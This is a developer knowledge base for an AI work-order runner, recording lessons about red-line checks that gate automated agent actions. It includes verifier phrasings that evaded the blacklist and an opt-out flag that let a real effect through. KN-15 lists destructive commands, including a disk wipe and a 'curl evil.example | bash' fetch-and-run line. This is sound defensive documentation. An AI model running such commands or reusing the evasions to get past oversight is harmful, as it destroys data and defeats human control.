# knowledge — ai-sdlc-runner knowledge base

> Single-file mode (entries < 30); spec: ai-sdlc `references/knowledge.md`. On entry read the
> INDEX and load only in-scope entries — never the whole file. Founded empty per the bootstrap
> rule (an empty INDEX is a legitimate knowledge base); see CHG-20260706-01.
> **Split threshold:** when entries reach 30, split into `entries/` (one file per entry, id as
> filename) and keep this file as the INDEX only; register every new tag in `vocabulary.json` first.

## INDEX (read this, not the whole file)

| id | tier | tags/scope | rule (one line) | status |
|----|------|-----------|-----------------|--------|
| KN-1 | pattern | contract / skill sourcing | `skills/` is the **only** skill source — a vendored `git archive` of the published skill's main HEAD, labelled by SKILL.md frontmatter, never copied from. The `ai-skills/` submodule fallback was deleted in CHG-20260822-02 (upstream archived 2026-08-04, succeeded by `skill-ai-sdlc-autopilot`). | **superseded by CHG-20260823-01 — there is no store, and no skill** |
| KN-2 | pattern | contract / version lock | Per-project `.sdlc-lock.json` locks major.minor; `runner.yaml` `contract_version` is a first-run default only; version bumps never touch existing locks; `migrate` is explicit & validating (patch=auto, minor/major=migrate-required), never silent auto-migrate. | **superseded by CHG-20260823-01 — no contract, no per-project lock** |
| KN-3 | pattern | dashboard / TUI | Terminal-only stdlib `curses` with a numbered / non-TTY fallback; panels computed on real events and cached (no per-keystroke I/O); red-line gates still require explicit human approval. | **superseded by CHG-20260823-01 — the dashboard went with the four-stage path; only `tui`'s selector and high-risk confirmation remain** |
| KN-4 | pattern | toolchain / handshake step 0 | `requirements-dev.txt` is a DERIVED, probe-facing view of `pyproject.toml`'s extras: **bare distribution names only** — the probe returns `NOT_RUN` (not PASS) for version ranges, `-e`/`-r` lines, URLs, extras and markers, so "adding the version floors back" silently disables the gate. | active |
| KN-5 | pattern | node-engine / work order | A work order carries **exactly** the closed D5 field set and nothing else: no tool names, no allowlist, no skill-loading line, no session or prior-turn context, no model/dispatch settings. Bodies are never inlined — paths and anchors only — and a content element id never appears without the path and anchor it resolves to. Routing (which model answers) lives in the dispatcher, never in the order. | **still holds in substance; the order's fields changed with CHG-20260823-01** |
| KN-6 | pattern | node-engine / idempotence | An operation may be an **effect** only if it leaves a probeable postcondition in the ledger, git or the forge; constructing one without a probe raises. Probes describe the **postcondition, not the action**, and read the world rather than any record the runner wrote. Unanswerable **raises** — never `False`. Nothing already true is re-applied, before or after the frontier. | active |
| KN-7 | pattern | node-engine / sessions | Every **asking** node gets its own session: opened, asked once, closed in a `finally`; a factory that returns a session it already returned is refused. A multi-seat review is several asks, so each seat is its own session. The question is journalled **before** the session opens, so a dropped session costs the answer and not the question. | active |
| KN-8 | pattern | governance / wiring | A mechanism is not built until something calls it. Three rounds here shipped a correct piece that nothing reached — an engine ignoring its own policy verdict, an `adjudicate` no caller invoked, a `PERMANENT_HALTS` list printed into every order and never checked — and each passed its own suite. The test that matters is the one that fails when the wire is cut. | active |
| KN-15 | pattern | governance / checks | **A recogniser needs three answers, not two.** "No dangerous pattern matched" is not "safe" — it is "I did not recognise this". Five destructive commands declared ordinary ran a flow to completion because a blacklist's silence was read as assent, and the disclosure meant to catch that was keyed on *having named a target* rather than on one being **recognised**. Unknown must be its own state, and it is not the safe one. | active |
| KN-14 | practice | governance / verification | **Freeze the tree before verification, and do not touch it until every seat reports.** A verifier found the working tree change under it mid-audit — and the change was to the safety check it was auditing. An acceptance round whose subject moved has verified nothing, however good its findings are. | active |
| KN-13 | pattern | governance / checks | **A false-stop rate is a safety property.** A red-line check measured 95% false positives on ordinary engineering briefs — a check that fires on two jobs in three gets switched off, and switching it off is one flag away. And a benchmark you author for your own mechanism flatters it: mine measured 0% on briefs I chose; a verifier's corpus measured 85%. | active |
| KN-12 | pattern | governance / checks | **Where** a check runs decides whether it runs. Three placement bugs in one repo: a brief-reading check placed after the early return so it never saw the path that mattered, a report line after the loop that four of five exits jumped past, and a red-line check that read one field of a record while the giveaway sat in the next one. Each looked correct in the diff. | active |
| KN-11 | pattern | governance / trust boundaries | Read the **fact**, not the claim. A declaration is what somebody says an operation is; a target (`kubectl apply -f prod/`, `secrets/key.pem`) is what it will touch. Facts may overrule claims; prose may not. And where a trust boundary cannot be removed, **record it** — an operation nothing verified belongs in the report, not in silence. | active |
| KN-10 | pattern | governance / red lines | A blacklist cannot be a safety guarantee. Two verifiers independently broke all six permanent halts with ordinary English containing no listed word, and a plan that simply **omitted** its operations was checked against nothing at all. The fix is the inversion: each operation **declares** its kind from a closed set, an undeclared one is refused, and word lists are demoted to a backstop that can only add a stop. | active |
| KN-9 | pattern | governance / vocabularies | A vocabulary that classifies must be **closed**: an unrecognised value is a failure, never a pass. The ledger lint knew only "built", so `accepted`, `merged`, `completed` and `完成` all sailed past it with no acceptance record. And read the **field**, not the prose around it — `draft — all 9 tasks built` is a draft. | active |

<!-- Append DIR-n (user directives) / KN-n (observed patterns) as anchored sections below and add
     one INDEX row each; register any new tag in vocabulary.json first. -->

## KN-1 — Offline skill-store vendoring pattern

> **Superseded by CHG-20260823-01.** There is no store and no skill: `skills/` and
> `elements/` were deleted and nothing reads either. Kept as the record of why the
> store existed and how it was pinned, which is what a later reader of the history
> will need.
*tags: contract · source: CHG-20260703-01, CHG-20260703-06, CHG-20260822-02, CHG-20260822-03 · tier: pattern*

The runner sources the `ai-sdlc` skill **offline-first**. `skills/<version>/` is the PRIMARY store,
each version vendored verbatim as an offline `git archive` of the published skill's `main` HEAD and
labelled by that checkout's SKILL.md frontmatter version (e.g. `v1.12.1` @ `605425e`, `v1.16.0` @
`b4d6ef3`, `v1.64.0` @ `e3d27c3`) — versions without a git tag are still pinned by commit. The
upstream repo is now `kamira/skill-ai-sdlc-autopilot` (CHG-20260822-02). The store is treated as read-only
reference: the runner **never re-implements skill logic and never copies skill markdown into itself**
(ai-guideline §7).

**There is no longer a submodule fallback.** `.gitmodules` declared one against `kamira/ai-skills`,
which was **archived 2026-08-04** and succeeded by `kamira/skill-ai-sdlc-autopilot` (which also
merged `ai-sdlc` + `ai-sdlc-autopilot` into one skill at v1.18.0, so the inner path changed too).
The submodule had never been wired up and the directory never existed; CHG-20260822-02 deleted the
declaration. To use a skill checkout outside the store, pass `--skill-path` at its skill root.
Adding a store version bumps `runner.yaml`'s `contract_version` default for *new* projects only.

## KN-2 — Per-project version-lock & migrate semantics

> **Superseded by CHG-20260823-01.** There is no contract to lock and no per-project
> lock file. The principle it protected — a version change is explicit and validating,
> never silent — survives as the tighten-only rule in `policy.verdict`.
*tags: contract · source: CHG-20260617-01, CHG-20260703-01, CHG-20260703-06 · tier: pattern*

Version resolution is per governed project, not global. Each project carries its own
`.sdlc-lock.json` pinning **major.minor**; the runner resolves the contract against that lock.
`runner.yaml`'s `contract_version` is only the **first-run default** — bumping it (on new vendored
versions) leaves all existing per-project locks untouched (1.0 / 1.1 / 1.12 locks keep resolving to
their stores). Update detection is **read-only** and never auto-migrates: patch drift = auto-OK,
minor/major drift = `migrate`-required, surfaced as a mismatch rather than silent drift. `migrate`
is explicit and validating (ai-guideline §5). Lock files belong to the governed project, never to
this runner repo.

## KN-3 — Dashboard / curses conventions
*tags: dashboard · source: CHG-20260617-02, CHG-20260617-03, CHG-20260703-04, CHG-20260703-05 · tier: pattern*

The interactive view is a **terminal `curses`** app (stdlib only, consistent with the runner's
zero-dependency, pure-backend stance), with a numbered-menu / non-TTY fallback so behaviour degrades
gracefully. The vertical `render_snapshot` path is **always preserved** for snapshot callers. Panels
(status, exec log, verify/ACC list, agent log) are built by `DashboardModel` from real events and
**cached** — refreshed on open / after a run / explicit `refresh()`, so per-keystroke redraws do zero
git/disk I/O (the typing-lag fix). Wide/CJK input goes through `get_wch()` with char-level width.
At a HALT gate the dashboard presents Approve/Reject, but **red lines still require explicit human
approval** — the presentation layer never relaxes a governance gate.

## KN-4 — The toolchain probe only parses bare names; anything richer silently means "not checked"
*tags: toolchain · source: CHG-20260822-01 · tier: pattern*

The ai-sdlc entry handshake's step 0 runs `toolchain_probe.sh`, which reads dev dependencies from
**`requirements-dev.txt` and no other file**. This repo declares them in `pyproject.toml`'s
`[project.optional-dependencies]`, so before CHG-20260822-01 the gate returned `NOT_RUN` (exit 4) on
every session — which means *the check did not run*, not *nothing to check*.

`requirements-dev.txt` here is therefore a **derived, probe-facing view**, and `pyproject.toml`
remains the authority for versions. Two things about it are easy to get wrong, both measured against
the probe rather than reasoned about:

- **Only bare names reach `PASS`.** Measured: `-e .[yaml,test]` → `NOT_RUN`; `PyYAML>=6.0` →
  `NOT_RUN` (range specifiers fall to the "existence verified only" branch, and *any* unparsed line
  forces `NOT_RUN`); `pytest==7.0.0` against a different installed version → `BLOCKED`; bare
  `PyYAML` / `pytest` → **`PASS`**.
- **The dangerous edit looks like an improvement.** Restoring the version floors to this file — the
  natural instinct on reading it — turns the gate back off while making the file *appear* more
  rigorous. `tests/test_requirements_dev_sync.py` exists for exactly this: it fails on any non-bare
  line, and on any drift from the pyproject extras. A mutation check confirmed the test and the probe
  fail together.

Exact `==` pins also reach `PASS` but are rejected here: the dev image is rebuilt every session and
CI spans py3.9/3.13, so a pin would flip to `BLOCKED` on the next routine upgrade.

**What the green means, narrowly:** the dev dependencies are *installed*. It does not check
`>=6.0`/`>=7.0` — pip enforces those at install time. Still strictly more than `NOT_RUN`, which
verified nothing.

**Still true, for a different reason (CHG-20260823-01).** The probe belongs to an entry handshake
outside this repo, and this repo neither ships nor runs it any more. `requirements-dev.txt` is kept
regardless, because the rule generalises: it is a derived, bare-names-only view of the pyproject
extras, and `tests/test_requirements_dev_sync.py` still fails on any non-bare line or any drift. The
edit that looks like an improvement is still the edit that breaks it.

**Upstream fix, no longer ours:** the probe should read `[project.optional-dependencies]` directly.
That belongs to **`kamira/skill-ai-sdlc-autopilot`** — successor to `ai-skills`, which was archived
2026-08-04 — cloned locally as a sibling directory and still carrying the same unfixed probe. It is
reachable but is a separate governance domain, and a fix there reaches this repo only once a fixed
skill version is installed or vendored. On this side the workaround stands: the submodule is absent,
the vendored store tops out at v1.16.0 (predating the probe), and KN-1 forbids editing the store.

## KN-5 — The work-order contract: what a dispatched node receives, and what it must never receive
*tags: node-engine · source: CHG-20260822-04 task 5 · tier: pattern*

`workorder.WORK_ORDER_FIELDS` is the complete set, and rendering asserts the produced keys are
**exactly** it — no more, no fewer. The exclusions are the load-bearing half, because they are what
makes an order runnable on a model that has never seen this runner: concrete tool names and
allowlists, the "load the ai-sdlc skill" bootstrap line, session or prior-turn context, model and
dispatch settings. An order carrying any of them runs on one harness only, however short it is.

Two traps this repo has already fallen into, both recorded so the next reader does not repeat them:

- **`agents.RoleSpec` is not a source of truth for capabilities.** Its `tools` list is *synthesised
  here* — `Read`, `Bash`, `Edit`, `Write`, `Agent` are Claude Code names hard-coded in `agents.py`,
  not shipped data — and its `writes_docs` flag is guessed from prose in the Notes column. Only the
  three shipped booleans (`can_spawn` / `writable` / `can_execute`) may be read, and they must never
  be derived back from tool names.
- **Check the exclusion by enumerating what is present, never by searching for banned words.** A
  substring search for a forbidden term scores 21 false positives on this corpus — `pr` inside "Org
  **pr**inciples", `merge` inside "E**merge**ncy" — and it failed the guard test written for task 2
  on its first run. Two instruments work: a closed key set, and a **sentinel** injected through the
  field you fear leaking, asserted absent from the serialised order by exact value.

**Nine of thirteen declared roles cannot be rendered at all**, and that is deliberate: the shipped
role table has four rows, and `orchestrator`, `integrator`, `reviewer` and the six `seat-*` roles
have no capability data anywhere in the store. Rendering one is a hard error naming the role.
Defaulting the flags is not a neutral safe default but this runner authoring an authorization policy.

## KN-6 — Effect admissibility and the shape of a probe
*tags: node-engine · source: CHG-20260822-04 tasks 6–7 (D6) · tier: pattern*

An operation may be an **effect** only if it leaves a probeable postcondition (D6.2), and that is
enforced rather than documented: `effects.Effect` raises if constructed without a probe, so an
unprobeable step never reaches a sequence. Resume means finding the **first unmet postcondition** and
running from there.

Three rules that are easy to get backwards, each learned the hard way:

1. **A probe describes the postcondition, not the action.** "Did we run push?" needs a record we
   wrote — the thing a crash destroys or leaves stale. "Does the remote have this branch?" asks the
   thing itself. A probe that inspects our own records reintroduces the receipts D6.4/D6.5 refuses.
   The ledger probes are not an exception: a CHG naming its `Branch:`, a ticked box, an ACC file are
   the *deliverable*, read by the next session too. A receipt says "I did the thing"; the ledger *is*
   the thing.
2. **Unanswerable is not "not done".** An unreachable remote or a failing forge must raise, never
   return `False`. Collapsing the two is what makes a resume push twice or open a second PR.
3. **Nothing already true is ever re-applied** — before the frontier *or* after it. The first version
   applied everything past the frontier blindly, and the test named for that case asserted the unsafe
   behaviour, so it was hiding the hazard rather than catching it; **both review seats independently
   named it their worst finding**. An effect found true *past* the frontier means the world is out of
   causal order, usually the residue of an abandoned attempt: report it, do not silently redo it and
   do not silently accept it.

Verification bar for anything in this family: kill a **real process** with `os._exit` against a
**real** repository. An in-process exception is not a stand-in — an exception unwinds, and unwinding
is the courtesy a killed process does not extend.

## KN-7 — One ask, one session; the question outlives it
*tags: node-engine · source: CHG-20260822-04 task 6 · tier: pattern*

Every node that asks a model gets its own session, opened and closed around that single ask. This is
a **correctness** property, not an economy: continuity breeds bias, which is the same reason the
shipped review panel runs phase 1 blind — *"a seat that reads first agrees first"*. A multi-seat
review is several asks, so each seat is its own session; otherwise "three seats" is one model
answering three times in one context.

The engine owns the lifecycle so this is enforced rather than hoped for: open, ask once, close in a
`finally`, and **a factory that hands back a session it already returned is refused** — that is the
persistent case by definition. Two mistakes made while building this, both worth inheriting:

- **Tell a session factory from a plain dispatcher by arity, not by duck-typing.** Both are usually
  plain callables; sniffing for an `ask` attribute calls one with the other's arguments.
- **`id()` is not identity.** Tracking sessions by `id()` broke on Python 3.13 and passed on 3.9 and
  3.11 by allocation luck: every ask drops its session, so CPython is free to hand a fresh one a
  recycled address. Hold the objects and compare with `is`. **This was the first thing the CI
  version axis ever caught** — the OS axis was added after five Windows-only failures survived four
  CHGs, and the same argument holds one axis over.

The question is journalled **before** the session opens and marked answered after, so a dropped
session costs the answer and not the question; what is pending is re-askable verbatim. Reconstructing
a question later risks asking a subtly different one, and a subtly different question is how a rerun
quietly stops being a rerun.

## KN-8 — A mechanism is not built until something calls it
*tags: governance · source: CHG-20260822-04, CHG-20260823-01 · tier: pattern*

This repo's most expensive recurring defect is not a wrong mechanism. It is a **right mechanism that
nothing reaches**, shipped with a green suite:

| Round | What was built | What actually called it |
|---|---|---|
| CHG-20260822-04 | the gate matrix, resolved per node | nothing — the engine walked past its own verdict |
| CHG-20260823-01 | `policy.adjudicate`, veto and majority | nothing — the seats were asked and their answers routed nowhere |
| CHG-20260823-01 | `policy.PERMANENT_HALTS` | nothing — all six were printed into every work order and never checked |
| CHG-20260823-01 | `effects` / `probes` / `ship` | nothing — three modules with tests and no importer |

Every one of them passed the tests written alongside it, because those tests exercised the mechanism
directly. That is the trap: a unit test proves the piece works, and says nothing about whether the
system consults it. All four were found by **independent verifiers**, not by the implementer and not
by CI.

Three habits follow, and they are cheap:

1. **Write the test that fails when the wire is cut.** Not "adjudicate returns fail on a majority
   against" — *"a majority against does not reach QA"*. The second one dies if the engine stops
   calling it; the first does not.
2. **Grep for the caller before ticking the box.** A symbol whose only references are its definition
   and its own test file is not wired in, whatever the done-when says.
3. **A comment describing behaviour is a claim.** `record_module`'s note said "three ordered
   effects" while the node did nothing at all. Either make it true or delete the sentence.

## KN-9 — Classifying vocabularies must be closed, and read the field not the prose
*tags: governance · source: CHG-20260823-01 · tier: pattern*

Two failures with one shape, both in the ledger lint, both silent:

**Open vocabulary.** The lint knew four words for "finished" — `built`, `已建置`, `implemented`,
`已實作` — and treated everything else as not-finished. So a change whose status said `accepted`,
`merged`, `completed` or `完成` passed with no acceptance record at all: a false green written in one
word, by someone doing nothing wrong. The fix is not more words. It is **closing the vocabulary**:
list what means finished, list what means unfinished, and make anything else a failure that names
its own remedy ("add the word to one of these two lists"). A classifier's default branch is where its
escapes live.

**Reading prose as data.** The same lint originally scanned whole documents for status words, so
writing *about* acceptance in a paragraph changed the document's classification — it happened three
times in one session, once inside the sentence explaining the first time. Narrowing it to the
`## Status` section was not enough: `**草稿 / draft — all 9 tasks built.**` still read as both. The
status is the **head** of that line; everything after the first dash, bracket or full stop is
commentary, and commentary does not decide anything.

Generalised: when a program classifies on text a person wrote, pin down exactly which span is the
datum, make the set of legal values closed, and treat both "unknown value" and "two values at once"
as errors that name the document.


## KN-10 — A blacklist is not a guarantee; invert the default instead
*tags: governance · source: CHG-20260823-02 · tier: pattern*

FR-12 said six actions are "never automated at any risk grade". The check behind that sentence was a
substring blacklist over the operation's description. Two independent verifiers broke it the same
afternoon, separately, with twelve ordinary English sentences between them:

| Red line | codex-seat | fable-seat |
|---|---|---|
| production deploy | `promote the new build into the live environment` | `push the new build to prod` |
| data migration | `rewrite all customer rows to the new format` | `alter the table schema` |
| hard delete | `erase every customer record permanently` | `wipe the users table` |
| moving money | `wire USD 500 to the vendor` | `wire 500 USD to the vendor` |
| secrets / access | `grant Alice administrator privileges` | `rotate the signing key` |
| publishing | `make the embargoed article visible to everyone` | `make the repo public` |

Every one was dispatched. **Adding those twelve phrasings would have fixed nothing** — the next
twelve are free, and free again after that. The defect was never the list's contents.

Two things were actually wrong, and both are about **defaults**:

1. **The classifier's default branch was "proceed".** Anything the word list failed to recognise was
   treated as ordinary. A red line whose default branch is proceed is not a red line.
2. **Silence was treated as a declaration.** The check only read the operations a plan volunteered,
   so omitting the field skipped it entirely. The guarantee could be evaded by saying *less* rather
   than by saying something false — which is worse, because saying less looks like nothing happened.

The fix inverts both. Every operation **declares** its kind from a closed set; an undeclared
operation is refused; a node that does real work and declares nothing is refused. Word lists survive
only as a **backstop** against a red line mis-declared as ordinary, in the one direction where a
word list is safe: it can add a stop and can never remove one.

The general rule, which is KN-9 one level up: **when a check decides whether something dangerous may
proceed, the unrecognised case must be the stopping case, and absence of input must not read as
absence of risk.**

**And the escape hatch is part of the check.** The relaxation added alongside this fix —
`undeclared="allow"`, "for a dry run" — turned out to cover the one case it was never meant to: a
verifier attached a real effect, set the flag, and watched the effect apply with nothing checked. A
dry run changes nothing; a run that changes the world is not one, whatever the flag is called. When
a safety check gets an opt-out, the opt-out needs its own boundary written down and tested, or the
guarantee is only as strong as the name of the flag that disables it.

What this does *not* buy, stated because the limit is real and **measured**: an operation declared
`ordinary` whose description does not give it away is dispatched. Across eighteen red-line sentences
written by two verifiers over three rounds, the backstop catches **8**. A third round produced six
more — "activate revision 42 on the customer-facing cluster", "remit five hundred dollars to our
supplier", "obliterate the audit archive beyond recovery" — and the widened lists catch **none** of
them.

I had written "deliberately generous" in the docstring and guessed twelve when pinning the number in
a test. Eight. Being wrong by four about my own mechanism is the argument for measuring a safety
claim instead of describing it: `tests/test_flow.py::test_the_backstop_is_weak_and_the_number_is_
written_down` keeps the count where a change has to look at it, and says in its own name that it is
a record of weakness rather than an assertion of strength.

**Built in CHG-20260823-04**, because a limit disclosed three rounds running stops being a
disclosure and starts being an excuse. An operation may name the **targets** it will act on, and
those are read directly: `rm -rf` in a command is not a phrasing choice, and a path under `secrets/`
is not an opinion. Because they are facts rather than claims, targets are allowed to **overrule** a
declaration of `ordinary` — which the word lists never were.

The trust that remains is recorded rather than assumed away: an operation declaring `ordinary` with
no targets is taken on the plan's word and lands in the run report under `on_trust`. It is not
blocked, because an empty target list is exactly as forgeable as a wrong `kind` and requiring one
would buy ceremony rather than safety. **Not removed, but no longer invisible** is the honest shape
of a trust boundary you cannot eliminate.

The test that was supposed to cover all of this fed each rule's own description back into its own
word list and asserted it matched. A tautology, and it passed, and it gave false confidence in
exactly the coverage that did not exist. **The corpus is now the twelve sentences that broke it** —
a test written from what actually failed, not from what the mechanism does.


## KN-11 — Read the fact, not the claim; and where trust remains, record it
*tags: governance · source: CHG-20260823-04 · tier: pattern*

A red-line check has three kinds of evidence available, and they are not equal:

| Evidence | What it is | May overrule |
|---|---|---|
| **the target** — `kubectl apply -f prod/`, `rm -rf /srv/audit`, `secrets/key.pem` | a fact about what will be touched | everything below |
| **the declaration** — the plan's `kind` field | a claim the planner makes | the backstop |
| **the description** — prose, matched against word lists | a claim, phrased freely | nothing |

The ordering is not a preference. `rm -rf` in a command is not a phrasing choice; "obliterate the
audit archive beyond recovery" is. That is exactly why targets may overrule a declaration and word
lists may not: **a check earns the right to contradict somebody in proportion to how little of it
they control.**

This repo learned it the long way. The first version read only prose and two verifiers broke all six
red lines with ordinary English. The second made the declaration the guarantee and inverted the
defaults, which held — and then every round for three rounds closed with the same sentence: *the
declaration is only as strong as the planner.* A limit disclosed three times without being closed
stops being a disclosure and starts being an excuse.

**Two corollaries worth keeping:**

**Report every match, not the first.** `.env.production` is a secrets file *and* sits in something
called production. Stopping while naming one of them is a half-truth, and half-truths are how people
stop believing a stop.

**Where a trust boundary cannot be removed, record it.** An operation that declares `ordinary` and
names no targets rests on the planner's word, and there is no way around that: an empty target list
is exactly as forgeable as a wrong `kind`, so *requiring* one buys ceremony rather than safety. The
answer is not to block it and not to ignore it — it goes into the run report under `on_trust`, where
an auditor reads which steps nothing verified. **Not removed, but no longer invisible** is the
honest end state for a trust you cannot eliminate, and it is a much better one than a mechanism that
implies it eliminated it.


## KN-12 — Where a check runs decides whether it runs
*tags: governance · source: CHG-20260823-05 · tier: pattern*

Three defects in this repo, all found within one change, all the same shape: the logic was right and
it was in the wrong place. Each read correctly in review, because reading a diff shows you what the
code *says*, not which paths reach it.

**Reading one field while the giveaway is in the next one.** The red-line backstop read
`operation["description"]`. A work order whose `instructions` said *"deploy the new build to
production, then wipe the users table"* ran to completion, with the operation beside it declaring
`ordinary`. The words were in the text the engineer would act on. For three changes this repo
disclosed the limit as *"a description that gives nothing away gets through"*; the truth was that a
description **giving itself away** got through, if it did so in the other field.

**Placed after the early return.** Once the brief check existed, it sat below the undeclared-check
block — which returns early on `--undeclared allow`. That is exactly the flag somebody is using when
they have declared nothing, and therefore exactly the case where the brief is the only evidence
there is. The check existed, was tested, and could not fire where it was needed.

**Placed after the loop.** The unspent-confirmation report sat past the `for`, where four of the
five ways a walk can end — halt, terminal, permanent halt, effect failure — return directly. A
report that is only correct when the run succeeds is not a report.

The general rule: **for any check, name the paths that reach it before believing it covers
anything.** Three questions that would have caught all three:

1. *What returns before this?* An early return above a check is a hole shaped exactly like the
   condition that triggers it.
2. *What are the other exits?* Anything that finalises state belongs on every exit, not on the happy
   one — or in a helper every exit calls, which is the fix used here.
3. *What else carries this information?* A record with several free-text fields gives a check as many
   blind spots as it has fields it does not read.

None of these is caught by a unit test of the check itself, which is why all three survived one. The
tests that found them ran the **whole flow** and asserted where it stopped.


## KN-13 — A false-stop rate is a safety property, and your own benchmark flatters you
*tags: governance · source: CHG-20260823-06 · tier: pattern*

Two lessons, one measurement.

### The rate is a safety number, not an ergonomics number

The red-line word lists were widened in round 2, when they were the only check, until they caught 8
of 18 adversarial sentences. Nobody measured what widening cost. A verifier did: **19 of 20 ordinary
engineering briefs were stopped.**

| Brief | Classified as |
|---|---|
| `Fix the token parser` | changing secrets |
| `Remove all unused imports` | hard delete |
| `Add production-grade error messages` | production deploy |
| `Add an invoice parser test` | moving money |

The instinct is to file that under "annoying". It is not. **A check that fires on two jobs in three
does not get obeyed — it gets switched off**, and this one had a documented flag to switch it off
with. A safeguard at 95% false positives protects less than a safeguard at 40%, because nobody keeps
the first one on. When the escape hatch is one flag away, the false-stop rate *is* the residual risk.

The fix was to narrow, not to widen further: a phrase belongs on such a list only if it **cannot
plausibly describe safe work**. Single common verbs are the vocabulary of ordinary engineering.
Measured after: **0% false stops, 6 of 18 caught** — two fewer catches on the weakest of four
layers, in exchange for twenty-five fewer false stops. Not a close call.

### A benchmark you write for your own mechanism flatters it

The day before, this repo had a test measuring the same rate at **0%**, on twenty briefs I wrote
myself. They were the briefs *I* would write, and they unconsciously avoided the words my own check
matched. The number was true and worthless.

The verifier's twenty were not chosen to be hard; they were just not chosen by the author of the
thing being measured. That was the whole difference — 0% versus 85%.

**Keep the adversary's corpus verbatim.** `tests/test_false_stops.py` holds both, and the borrowed
half is the one that matters. When measuring your own mechanism, an outside sample is not a nice
extra; it is the only part of the measurement that can surprise you.

## KN-14 — Freeze the tree before verification
*tags: governance · source: CHG-20260823-06 · tier: practice*

A verifier began an acceptance round on a clean tree, and partway through found
`M src/ai_sdlc_runner/engine.py` — because the implementer was still working. The edit changed the
exact safety check being audited. It refused to certify the result, correctly.

**An acceptance round whose subject changed while it was being examined has verified nothing**,
however good the findings happen to be. Two rounds were lost to this: one voided, and one stopped
early once the contamination was noticed rather than letting it audit a moving target.

The practice, and it costs nothing:

1. **Commit and push** before asking for verification. Name the commit in the brief.
2. **Do not edit until every seat has reported.** The urge to fix a finding while another seat is
   still reading is exactly the failure.
3. If a verifier reports the tree moving under it, **that finding outranks the technical ones** —
   the round is void and the technical findings are advisory until re-run.

The round before this one, a verifier had already worked around the same hazard by exporting a clean
snapshot with `git archive`, and said so in its report. The lesson was available and not taken. That
is the more useful half of this entry: a hazard somebody else routed around is still your hazard.


## KN-15 — A recogniser needs three answers, not two
*tags: governance · source: CHG-20260823-07 · tier: pattern*

This repo replaced a prose blacklist with a **target** blacklist and called the problem solved:
prose is a claim, `rm -rf` is a fact, and facts may overrule claims. All true, and it missed the
actual defect. A verifier declared five destructive commands `ordinary`, named them as targets, and
watched every one run a flow to completion with an empty report:

```
kubectl delete namespace legacy   find /var/data -type f -delete   dd if=/dev/zero of=/dev/sda
git reflog expire --expire=now --all                              curl http://evil.example/i.sh | bash
```

None is exotic. They are simply not on the list, and **no list of dangerous things is ever
finished.** The bug was never the list's contents; it was that a list returning nothing was read as
*verified safe* rather than as *I did not recognise this*. Two answers where there are three.

| Answer | Means | Treat as |
|---|---|---|
| red | recognised as dangerous | stop |
| ordinary | recognised as safe | proceed |
| **unrecognised** | **recognised as nothing** | **stop, or proceed and record — never silently** |

The fix is not a longer blacklist. It is a **safe-list beside it**, so that "matched neither" is a
state the program can hold rather than a hole it falls through. That also moves the incompleteness
to the safer side: an unknown command now stops instead of proceeding.

### The safety net had the same hole, and that is the sharper lesson

An `on_trust` report line already existed for exactly this — KN-11's *record it, not in silence*.
It fired when the operation named **no targets**. So naming any target, a benign `a.py`, switched
the disclosure off — and the five commands were neither stopped nor recorded.

The condition was written about the *shape of the input* ("did they give us targets?") when the
question is about the *outcome of the check* ("did anything actually confirm this?"). Those read
identically while the recogniser has no third state, and they come apart the moment it does.

**When writing a disclosure for what a check could not verify, key it on the check's result, never
on whether input was supplied.** Input arriving is not verification happening.

### And it was tested, in the way that guarantees nothing

Every test paired an adversarial sentence with a target the blacklist already knew, and one test
pinned the hole as the requirement: *"an operation that names targets is not recorded as trusted"* —
asserting the implementation rather than the intent. 433 tests passed before the bug was reproduced
and after. KN-8's shape again: **a test that feeds the mechanism only what the mechanism can
digest.** The corpus that matters is the one built from what the mechanism cannot.
